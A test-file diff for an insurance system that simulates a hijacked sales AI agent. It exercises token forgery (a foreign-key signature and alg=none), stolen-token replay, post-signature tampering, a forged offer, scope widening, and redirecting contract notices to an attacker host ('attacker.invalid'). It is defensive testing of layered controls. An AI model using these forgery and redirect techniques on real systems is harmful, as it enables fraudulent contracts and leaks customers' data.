@@ -1,0 +1,514 @@
+// シナリオ: リスク × 手口 × 防御の漏れ（scenarios の 2〜3 章）。クラスタの secure と vulnerable で確かめる。
+// 乗っ取られた営業 AI エージェントは、その ServiceAccount で動く probe が演じる（自分の SVID で A を B に替え、道具を直接呼ぶ）。
+// 各シナリオで、(1) 防御が全てあれば被害が出ない（secure と vulnerable）、(2) 止める防御を 1 つずつ外しても、ほかの防御が止める、
+// (3) 最小の漏れの組を外すと被害が出る（vulnerable）、を確かめる。シナリオ 4（期限切れ）は expiry.test.ts にある。
+import { generateKeyPair, SignJWT } from "jose";
+import { afterEach, describe, expect, it } from "vitest";
+import { reconcile } from "../../packages/customer-app/src/reconcile.ts";
+import {
+  applyArgs, atMcp, backendPost, contractsOf, Customer, exchangeAs, ISSUER, mcpCall, offerFor, probe, records, setDefenses, setTamper,
+  TERMS, type Gaps, type Json, type Ns, type Offer, type Submission,
+} from "./world.ts";
+
+const FULL_ROUTE = ["insurer-mcp", "sales-agent"];
+const WIDE = [{ type: "insurance_application", kinds: ["fixed", "lifetime"], maxBenefit: 100_000_000 }];
+const FIXED_ONLY = [{ type: "insurance_application", kinds: ["fixed"], maxBenefit: 10_000_000 }];
+
+// ---- 顧客（トークンの期限の前に、受け取り直す） ----
+const cache = new Map<string, { at: number; c: Customer }>();
+async function customer(ns: Ns, user: string, terms: unknown = TERMS): Promise<Customer> {
+  const key = `${ns}:${user}:${JSON.stringify(terms)}`;
+  const hit = cache.get(key);
+  if (hit && Date.now() - hit.at < 200_000) return hit.c;
+  const c = await new Customer(ns, user).setup(terms);
+  cache.set(key, { at: Date.now(), c });
+  return c;
+}
+
+// ---- 防御（vulnerable で外す設定） ----
+const D = {
+  D1: { D1: "off" },
+  "D2 素通し": { D2: "passthrough" },
+  "D2 自分の資格": { D2: "client-credentials" },
+  D3a: { D3a: "off" },
+  D3c: { D3c: "off" },
+  D3d: { D3d: "off" },
+  D3e: { D3e: "off" },
+  D3f: { D3f: "off" },
+  D5: { D5: "off" },
+  D7: { D7: "off" },
+  D8: { D8: "off" },
+  D9: { D9: "off" },
+  D10: { D10: "off" },
+  D11: { D11: "off" },
+  D12: { D12: "off" },
+  D13: { D13: "off" },
+  D14: { D14: "off" },
+  D15: { D15: "off" },
+  D16: { D16: "off" },
+  D17: { D17: "off" },
+  D18: { D18: "off" },
+  "D26 営業 AI エージェント": { "D26@sales-agent": "off" },
+  "D26 事務サービス": { "D26@insurer-mcp": "off" },
+  "D26 保険会社のシステム": { "D26@insurer-backend": "off" },
+  "D27 事務サービス": { "D27@insurer-mcp": "off" },
+  "D27 保険会社のシステム": { "D27@insurer-backend": "off" },
+} satisfies Record<string, Gaps>;
+type DefName = keyof typeof D;
+const gapsOf = (names: DefName[]): Gaps => Object.assign({}, ...names.map((n) => D[n]));
+
+afterEach(async () => {
+  await setDefenses({});
+  await setTamper(false);
+});
+
+// ---- シナリオの型 ----
+// defenses: どれか 1 つでもあれば被害が出ない防御。minimal: 被害が出るのに外す必要がある防御（省略時は defenses 全部）。
+function scenario<C>(
+  n: number,
+  title: string,
+  s: {
+    defenses: DefName[];
+    minimal?: DefName[];
+    prepare: (ns: Ns) => Promise<C>;
+    attack: (ns: Ns, c: C) => Promise<unknown>;
+    harmed: (ns: Ns, c: C) => Promise<boolean>;
+    secure?: false;
+  },
+  extra?: () => void,
+) {
+  describe(`${n}. ${title}`, () => {
+    // 攻撃の材料は、防御を全て入れたまま準備する。外すのは、攻撃の直前である
+    const run = async (ns: Ns, gaps: DefName[]) => {
+      const c = await s.prepare(ns);
+      if (ns === "vulnerable") await setDefenses(gapsOf(gaps));
+      await s.attack(ns, c).catch(() => undefined); // 途中で拒否されても、被害の有無で判定する
+      return s.harmed(ns, c);
+    };
+    if (s.secure !== false) it("secure: 防御が全てあれば、被害は出ない", async () => expect(await run("secure", [])).toBe(false));
+    it(`vulnerable（${s.defenses.join("、")} が全てある）: 被害は出ない`, async () => expect(await run("vulnerable", [])).toBe(false));
+    if (s.defenses.length > 1) {
+      for (const d of s.defenses) {
+        it(`vulnerable（${d} だけを外す）: ほかの防御が止める`, async () => expect(await run("vulnerable", [d])).toBe(false));
+      }
+    }
+    const min = s.minimal ?? s.defenses;
+    it(`vulnerable（${min.join("、")} を外す）: 被害が出る`, async () => expect(await run("vulnerable", min)).toBe(true));
+    extra?.();
+  });
+}
+
+// ---- 補助 ----
+const submitViaMcp = async (ns: Ns, token: string, s: Submission, extras?: Json) =>
+  mcpCall(ns, token, "submit_application", applyArgs(s, extras));
+const unsigned = (s: Submission): Submission => ({ ...s, assertion: null, intentAssertion: null });
+const planOf = (offer: Offer, id: string) => offer.offerSet.plans.find((p) => p.id === id)!;
+const decode = (token: string) => JSON.parse(Buffer.from(token.split(".")[1]!, "base64url").toString()) as Json;
+const recorded = async (ns: Ns, nonce: string, pred: (c: Json) => boolean = () => true) => (await contractsOf(ns, nonce)).some(pred);
+const offRoute = (c: Json) => JSON.stringify(c.by) !== JSON.stringify(FULL_ROUTE);
+
+/** 保険会社の鍵ではない鍵で署名した、偽造トークン。結び付けは、出す probe の証明書に合わせる。 */
+async function forged(ns: Ns, sub: string, verified: unknown) {
+  const { privateKey } = await generateKeyPair("RS256");
+  const { x5t } = await probe(ns, "probe-mcp-1", "whoami");
+  return new SignJWT({ scope: ["apply"], authorization_details: TERMS, verified_claims: verified, act: { sub: "insurer-mcp", act: { sub: "sales-agent" } }, cnf: { "x5t#S256": x5t } })
+    .setProtectedHeader({ alg: "RS256", kid: "forged", typ: "at+jwt" })
+    .setIssuer(ISSUER(ns))
+    .setSubject(sub)
+    .setAudience("insurer-backend")
+    .setIssuedAt()
+    .setExpirationTime("10m")
+    .sign(privateKey);
+}
+
+// ======== R1 他人名義の申込みが通る ========
+scenario(1, "R1 × A1: 営業 AI エージェントが欄に「bob」と書き、bob 名義で申し込む", {
+  defenses: ["D2 自分の資格", "D9", "D11", "D13", "D14"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(await customer(ns, "bob"));
+    const sub = alice.prepare(offer, "fixed-60");
+    return { alice, sub: unsigned({ ...sub, application: { ...sub.application, customer: "bob" }, intent: { ...sub.intent, customer: "bob" } }), offer };
+  },
+  attack: async (ns, { alice, sub }) =>
+    submitViaMcp(ns, await atMcp(alice), sub, { verified_claims: decode(alice.token).verified_claims, on_behalf_of: "bob" }),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, (c) => c.contract.customer === "bob"),
+}, () => {
+  it("secure: 替えたトークンには、本人（sub）が残り、取り次いだ営業 AI エージェントが act に積まれる", async () => {
+    const b = decode(await atMcp(await customer("secure", "alice")));
+    expect(b.sub).toBe("alice");
+    expect(b.act.sub).toBe("sales-agent");
+  });
+});
+
+scenario(2, "R1 × A3: 偽造したトークンで、bob 名義の申込みを、保険会社のシステムへ直接出す", {
+  defenses: ["D5", "D10", "D13", "D14"],
+  prepare: async (ns) => {
+    const bob = await customer(ns, "bob");
+    const offer = await offerFor(bob);
+    return { offer, sub: unsigned(bob.prepare(offer, "fixed-60")), token: await forged(ns, "bob", decode(bob.token).verified_claims) };
+  },
+  attack: async (ns, { sub, token }) => backendPost(ns, token, sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce),
+}, () => {
+  it("secure: 署名のない（alg=none）トークンは受け付けない", async () => {
+    const b = (o: object) => Buffer.from(JSON.stringify(o)).toString("base64url");
+    const none = `${b({ alg: "none", typ: "at+jwt" })}.${b({ iss: ISSUER("secure"), sub: "alice", aud: "insurer-backend", exp: 4102444800 })}.`;
+    expect((await backendPost("secure", none, {})).status).toBe(401);
+  });
+});
+
+scenario(3, "R2 × A3: 偽造したトークンで、本人の知らない申込みを出す", {
+  defenses: ["D5", "D10", "D13", "D14"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(alice);
+    return { offer, sub: unsigned(alice.prepare(offer, "fixed-60")), token: await forged(ns, "alice", decode(alice.token).verified_claims) };
+  },
+  attack: async (ns, { sub, token }) => backendPost(ns, token, sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce),
+});
+
+scenario(5, "R2 × A5: 顧客の ID トークンを、申込みのトークンとして使う", {
+  defenses: ["D3c", "D7", "D8", "D10", "D11", "D13", "D14", "D15", "D26 保険会社のシステム"],
+  minimal: ["D3c", "D8", "D10", "D11", "D13", "D14", "D15", "D26 保険会社のシステム"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(alice);
+    return { alice, offer, sub: unsigned(alice.prepare(offer, "fixed-60")) };
+  },
+  // 発行の防御（D3c）が効くのは、ID トークンを受け取るときなので、受け取りから攻撃に含める
+  attack: async (ns, { alice, sub }) =>
+    backendPost(ns, (await new Customer(ns, "alice").setup()).idToken, { ...sub, verified_claims: decode(alice.token).verified_claims }),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce),
+});
+
+// ======== R3 本人確認の済んでいない人の申込みが通る ========
+scenario(6, "R3 × A2: 本人確認の済んでいない mallory が、alice の確認結果を名乗って申し込む", {
+  defenses: ["D11"],
+  prepare: async (ns) => {
+    const mallory = await customer(ns, "mallory");
+    const offer = await offerFor(mallory);
+    return { mallory, offer, sub: mallory.prepare(offer, "fixed-60"), claims: decode((await customer(ns, "alice")).token).verified_claims };
+  },
+  attack: async (ns, { mallory, sub, claims }) => submitViaMcp(ns, await atMcp(mallory), sub, { verified_claims: claims }),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce),
+}, () => {
+  it("secure: トークンには、確認の済んだ顧客だけに確認済みの属性が付く", async () => {
+    expect(decode((await customer("secure", "alice")).token).verified_claims.verification.method).toBeTruthy();
+    expect(decode((await customer("secure", "mallory")).token).verified_claims).toBeUndefined();
+  });
+});
+
+// ======== R4 本人が選んだ内容と違う契約になる ========
+// alice が「確定年金 10年・年額60万円」に署名 → 乗っ取られた営業 AI エージェントが、取決めの範囲で最も保険料が高い案に書き換えて出す
+scenario(7, "R4 × A8: 営業 AI エージェントが、署名のあとで申込みの内容を書き換える", {
+  defenses: ["D13", "D14"],
+  // secure には、書き換えを再現する受け口がない（D-20）
+  secure: false,
+  prepare: async (ns) => ({ alice: await customer(ns, "alice") }),
+  attack: async (_ns, { alice }) => {
+    await setTamper(true);
+    const chat = await alice.salesAgent("/chat", { message: "案を見たい" });
+    const offer = chat.body.offer as Offer;
+    (alice as Customer & { last?: string }).last = offer.nonce;
+    return alice.salesAgent("/submit", { ...alice.prepare(offer, "fixed-60"), offerSet: offer.offerSet });
+  },
+  harmed: async (ns, { alice }) => recorded(ns, (alice as Customer & { last?: string }).last!, (c) => c.contract.plan.id !== "fixed-60"),
+}, () => {
+  it("vulnerable: 信頼する事務サービス（mTLS）から届いたことだけで受け付けると、書き換えが通る", async () => {
+    await setDefenses({ D13: "mtls-only", D14: "off" });
+    const alice = await customer("vulnerable", "alice");
+    await setTamper(true);
+    const chat = await alice.salesAgent("/chat", { message: "案を見たい" });
+    const offer = chat.body.offer as Offer;
+    await alice.salesAgent("/submit", { ...alice.prepare(offer, "fixed-60"), offerSet: offer.offerSet });
+    expect(await recorded("vulnerable", offer.nonce, (c) => c.contract.plan.id !== "fixed-60")).toBe(true);
+  });
+});
+
+const GOLD = { id: "fixed-gold", name: "確定年金・特別", kind: "fixed", benefit: 600_000, monthly: 1_000 };
+async function forgedOffer(alice: Customer) {
+  const offer = await offerFor(alice);
+  const { privateKey } = await generateKeyPair("ES256");
+  const plans = [...offer.offerSet.plans, GOLD];
+  const { challengeOf } = await import("./probe/webauthn.ts");
+  const offerSetId = challengeOf({ customer: "alice", plans });
+  const offerJws = await new SignJWT({ customer: "alice", plans, offerSetId, nonce: offer.nonce })
+    .setProtectedHeader({ alg: "ES256", kid: "x", typ: "offer+jwt" })
+    .setIssuer("insurer-backend")
+    .setIssuedAt()
+    .setExpirationTime("10m")
+    .sign(privateKey);
+  return { offer, forged: { ...offer, offerSet: { customer: "alice", plans }, offerSetId, offerJws } };
+}
+
+scenario(8, "R4 × A9: 保険会社が示していない案で申し込む", {
+  defenses: ["D12"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const { forged: f } = await forgedOffer(alice);
+    return { alice, offer: f, sub: alice.prepare(f, "fixed-gold") };
+  },
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, await atMcp(alice), sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, (c) => c.contract.plan.id === "fixed-gold"),
+}, () => {
+  it("secure: 本物の提示を添えても、その提示にない案なら弾かれる", async () => {
+    const alice = await customer("secure", "alice");
+    const { offer, forged: f } = await forgedOffer(alice);
+    const r = await submitViaMcp("secure", await atMcp(alice), alice.prepare({ ...f, offerJws: offer.offerJws, offerSetId: offer.offerSetId }, "fixed-gold"));
+    expect(JSON.stringify(r.body)).toContain("案が提示に含まれる");
+  });
+});
+
+scenario(9, "R4 × A10: 意向確認と申込みの間で、内容をすり替える", {
+  defenses: ["D14"],
+  // 顧客は「確定年金 10年・年額60万円」の意向確認に署名したが、申込みは「終身年金・年額120万円」に署名してしまった
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(alice);
+    const sub = alice.prepare(offer, "fixed-60");
+    const application = { ...sub.application, plan: planOf(offer, "life-120") };
+    return { alice, offer, sub: { ...sub, application, assertion: alice.sign(application) } };
+  },
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, await atMcp(alice), sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, (c) => c.contract.plan.id === "life-120"),
+}, () => {
+  it("secure: 意向確認の署名がない申込みは弾かれる", async () => {
+    const alice = await customer("secure", "alice");
+    const sub = alice.prepare(await offerFor(alice), "fixed-60");
+    const r = await submitViaMcp("secure", await atMcp(alice), { ...sub, intentAssertion: null });
+    expect(JSON.stringify(r.body)).toContain("意向確認の署名");
+  });
+});
+
+scenario(10, "R4 × A14: 申込みと違う内容で、契約を記録させる", {
+  defenses: ["D17"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(alice);
+    return { alice, offer, sub: alice.prepare(offer, "fixed-60") };
+  },
+  attack: async (ns, { alice, offer, sub }) => submitViaMcp(ns, await atMcp(alice), sub, { contractEntry: { plan: planOf(offer, "life-240") } }),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, (c) => c.contract.plan.id === "life-240"),
+}, () => {
+  it("vulnerable: 事後に、顧客の自動照合が、通知と写しの食い違いに気づく", async () => {
+    await setDefenses({ D17: "off" });
+    const alice = await customer("vulnerable", "alice");
+    const offer = await offerFor(alice);
+    const sub = alice.prepare(offer, "fixed-60");
+    await submitViaMcp("vulnerable", await atMcp(alice), sub, { contractEntry: { plan: planOf(offer, "life-240") } });
+    const mine = reconcile([sub.application as never], (await alice.notices()) as never).filter((r) => r.nonce === offer.nonce);
+    expect(mine[0]?.status).toBe("mismatch");
+  });
+});
+
+scenario(11, "R5 × A11: 同じ申込みを二度出す", {
+  defenses: ["D16"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(alice);
+    return { alice, offer, sub: alice.prepare(offer, "fixed-60") };
+  },
+  attack: async (ns, { alice, sub }) => {
+    const b = await atMcp(alice);
+    await submitViaMcp(ns, b, sub);
+    return submitViaMcp(ns, b, sub);
+  },
+  harmed: async (ns, { offer }) => (await contractsOf(ns, offer.nonce)).length >= 2,
+});
+
+// ======== R6 取決めの範囲外の契約が通る ========
+scenario(12, "R6 × A12: 取決めの上限を超える案で申し込む", {
+  defenses: ["D15"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(alice);
+    return { alice, offer, sub: alice.prepare(offer, "life-240") };
+  },
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, await atMcp(alice), sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce),
+}, () => {
+  it("secure: 取決めにない種類の案は弾かれる", async () => {
+    const alice = await customer("secure", "alice", FIXED_ONLY);
+    const sub = alice.prepare(await offerFor(alice), "life-120");
+    expect(JSON.stringify((await submitViaMcp("secure", await atMcp(alice), sub)).body)).toContain("扱える保険の種類");
+  });
+});
+
+scenario(13, "R6 × A16: 替えるときに、取決めを広げてもらう", {
+  defenses: ["D3e"],
+  prepare: async (ns) => {
+    const alice = await customer(ns, "alice");
+    const offer = await offerFor(alice);
+    return { alice, offer, sub: alice.prepare(offer, "life-240") };
+  },
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, await atMcp(alice, WIDE), sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce),
+});
+
+// ======== R7 権限のない者や経路から、申込みが通る ========
+const signedFor = async (ns: Ns) => {
+  const alice = await customer(ns, "alice");
+  const offer = await offerFor(alice);
+  return { alice, offer, sub: alice.prepare(offer, "fixed-60") };
+};
+
+scenario(14, "R7 × A6: 営業 AI エージェント宛ての A で、保険会社のシステムへ直接申し込む", {
+  defenses: ["D7", "D26 保険会社のシステム"],
+  prepare: signedFor,
+  attack: async (ns, { alice, sub }) => backendPost(ns, alice.token, sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, offRoute),
+});
+
+scenario(15, "R7 × A7: 事務サービスが、受け取った B をそのまま保険会社のシステムへ流す", {
+  defenses: ["D2 素通し", "D7", "D26 保険会社のシステム"],
+  prepare: signedFor,
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, await atMcp(alice), sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, offRoute),
+});
+
+scenario(16, "R7 × A7: 営業 AI エージェントが、A を事務サービスへそのまま出す", {
+  defenses: ["D1", "D26 事務サービス", "D2 素通し", "D7", "D26 保険会社のシステム"],
+  prepare: signedFor,
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, alice.token, sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, offRoute),
+});
+
+scenario(17, "R7 × A16: どの窓口でも通る A で、保険会社のシステムへ直接申し込む", {
+  defenses: ["D3a", "D26 保険会社のシステム"],
+  prepare: signedFor,
+  // 発行の防御（D3a）が効くのは、トークンを受け取るときなので、受け取りから攻撃に含める
+  attack: async (ns, { sub }) => backendPost(ns, (await new Customer(ns, "alice").setup()).token, sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, offRoute),
+}, () => {
+  it("vulnerable: 短い有効期間を外すと、24 時間使えるトークンが出る（D3b）", async () => {
+    await setDefenses({ D3b: "off" });
+    const t = decode((await new Customer("vulnerable", "alice").setup()).token);
+    expect(t.exp - t.iat).toBeGreaterThan(3600);
+  });
+});
+
+scenario(18, "R7 × A13: 登録が外れた営業 AI エージェントが取り次いだ申込みを出す", {
+  defenses: ["D10"],
+  prepare: async (ns) => ({ ...(await signedFor(ns)), b: "" }),
+  attack: async (ns, c) => {
+    c.b = await atMcp(c.alice);
+    await probe(ns, "probe-operator", "operator", { action: "revoke", client: "sales-agent" });
+    try {
+      return await submitViaMcp(ns, c.b, c.sub);
+    } finally {
+      await probe(ns, "probe-operator", "operator", { action: "restore", client: "sales-agent" });
+    }
+  },
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce),
+}, () => {
+  it("secure: 登録が外れた営業 AI エージェントには、新しいトークンを出さない（D4）", async () => {
+    await probe("secure", "probe-operator", "operator", { action: "revoke", client: "sales-agent" });
+    try {
+      expect((await probe("secure", "probe-sales-agent", "client-credentials")).status).toBe(401);
+    } finally {
+      await probe("secure", "probe-operator", "operator", { action: "restore", client: "sales-agent" });
+    }
+  });
+  it("secure: 登録を外せるのは、運用の担当だけである", async () => {
+    expect((await probe("secure", "probe-intruder", "operator", { action: "revoke", client: "sales-agent" })).status).toBe(403);
+  });
+});
+
+// ======== R8 顧客が、届いた契約内容で照合できない（事後） ========
+scenario(19, "R8 × A15: 契約内容の通知先を、営業 AI エージェントが書いた連絡先にする", {
+  defenses: ["D18"],
+  prepare: signedFor,
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, await atMcp(alice), sub, { contact: "http://attacker.invalid/notices" }),
+  harmed: async (_ns, { alice, offer }) => !(await alice.notices()).some((n) => n.contract.nonce === offer.nonce),
+}, () => {
+  it("vulnerable: 事後に、通知が届かないことに、顧客の自動照合が気づく", async () => {
+    await setDefenses({ D18: "off" });
+    const { alice, offer, sub } = await signedFor("vulnerable");
+    await submitViaMcp("vulnerable", await atMcp(alice), sub, { contact: "http://attacker.invalid/notices" });
+    const mine = reconcile([sub.application as never], (await alice.notices()) as never).filter((r) => r.nonce === offer.nonce);
+    expect(mine[0]?.status).toBe("missing");
+  });
+});
+
+// ======== R9 誰が取り次いだかを、後から追えない（事後） ========
+scenario(20, "R9 × A16: 経由を残さない発行で、取り次いだ窓口が記録に残らない", {
+  defenses: ["D3d"],
+  prepare: signedFor,
+  attack: async (ns, { alice, sub }) => submitViaMcp(ns, await atMcp(alice), sub),
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, offRoute),
+});
+
+scenario(21, "R7 × A17: 営業 AI エージェントが、事務サービスを飛ばした宛先のトークンを求めて、直接申し込む", {
+  defenses: ["D3f", "D27 保険会社のシステム"],
+  prepare: signedFor,
+  attack: async (ns, { alice, sub }) => {
+    const c = await exchangeAs(ns, "probe-sales-agent", alice.token, "insurer-backend");
+    return backendPost(ns, c.body?.access_token, sub, "probe-sales-agent");
+  },
+  harmed: async (ns, { offer }) => recorded(ns, offer.nonce, offRoute),
+});
+
+// ======== R10 本人の契約の情報が、本人以外に漏れる ========
+scenario(22, "R10 × A18: 盗んだ A を、DPoP の鍵なしで使い、契約を照会させる", {
+  defenses: ["D26 営業 AI エージェント"],
+  prepare: async (ns) => ({ alice: await customer(ns, "alice"), r: {} as Json }),
+  attack: async (_ns, c) => (c.r = await c.alice.salesAgent("/chat", { message: "契約の一覧を見せて" }, "none")),
+  harmed: async (_ns, { r }) => r.status === 200 && /契約は \d+ 件/.test(String(r.body?.reply)),
+});
+
+scenario(23, "R10 × A19: 盗んだ B を、別のサービスの SVID で使い、契約を照会する", {
+  defenses: ["D26 事務サービス", "D27 事務サービス"],
+  prepare: async (ns) => ({ b: await atMcp(await customer(ns, "alice")), r: {} as Json }),
+  attack: async (ns, c) => (c.r = await mcpCall(ns, c.b, "list_contracts", {}, "probe-intruder")),
+  harmed: async (_ns, { r }) => r.status === 200 && Array.isArray(r.body?.contracts),
+});
+
+// ======== 補足: シナリオにしない防御と、隔たり ========
+describe("補足", () => {
+  it("secure: 営業 AI エージェントは、自分宛てでないトークン（B）を受け付けない（D20）", async () => {
+    const alice = await customer("secure", "alice");
+    const b = await atMcp(alice);
+    const r = await probe("secure", "probe-sales-agent", "call-sales-agent", { path: "/chat", body: { message: "見たい" }, token: b, dpopKey: alice.dpopKey });
+    expect(r.status).toBe(401);
+  });
+
+  it.each<[Ns, number]>([
+    ["secure", 401],
+    ["vulnerable", 200],
+  ])("%s: 盗んだ C を、結ばれた鍵と違う鍵の持ち主（別のノードの複製）から出すと、D26 で止まる（vulnerable は D26 を外す）", async (ns, status) => {
+    const alice = await customer(ns, "alice");
+    const c = (await exchangeAs(ns, "probe-mcp-1", await atMcp(alice), "insurer-backend")).body.access_token;
+    if (ns === "vulnerable") await setDefenses({ "D26@insurer-backend": "off" });
+    const r = await probe(ns, "probe-mcp-2", "call-service", { service: "insurer-backend", path: "/contracts", method: "GET", token: c });
+    expect(r.status).toBe(status);
+  });
+
+  it("secure: 防御を外す受け口がない（D-20）", async () => {
+    const r: Json = await probe("secure", "probe-intruder", "admin", { service: "insurer-backend", port: 9090, path: "/defenses" }).catch((e) => ({ error: String(e) }));
+    expect(r.status).toBeUndefined();
+  });
+
+  it("secure: 証明書のない接続と、もう一方の名前空間への接続は、つながらない", async () => {
+    const alice = await customer("secure", "alice");
+    const noCert = await probe("secure", "probe-mcp-1", "call-service", { service: "insurer-backend", path: "/applications", token: alice.token, body: {}, clientCert: false });
+    expect(noCert.status).toBeUndefined();
+    expect((await probe("secure", "probe-mcp-1", "reach-other-namespace", { namespace: "vulnerable", service: "insurer-backend" })).connected).toBe(false);
+  });
+
+  it("secure: トークンを URL に入れない（D24）。基本の流れのどの呼び出しのパスにも、トークンが現れない", async () => {
+    await records("secure");
+    const logs = await Promise.all(
+      ["sales-agent", "insurer-mcp", "insurer-backend"].map(async (d) => {
+        const { execFile } = await import("node:child_process");
+        return new Promise<string>((resolve) =>
+          execFile("kubectl", ["-n", "secure", "logs", `deploy/${d}`, "-c", "envoy", "--tail=2000"], { maxBuffer: 64 << 20 }, (_e, out) => resolve(out)),
+        );
+      }),
+    );
+    const paths = logs.join("\n").split("\n").filter((l) => l.startsWith("{")).map((l) => JSON.parse(l).path as string);
+    expect(paths.length).toBeGreaterThan(3);
+    expect(paths.filter((p) => /eyJ[\w-]+\.eyJ/.test(p))).toEqual([]);
+  });
+});
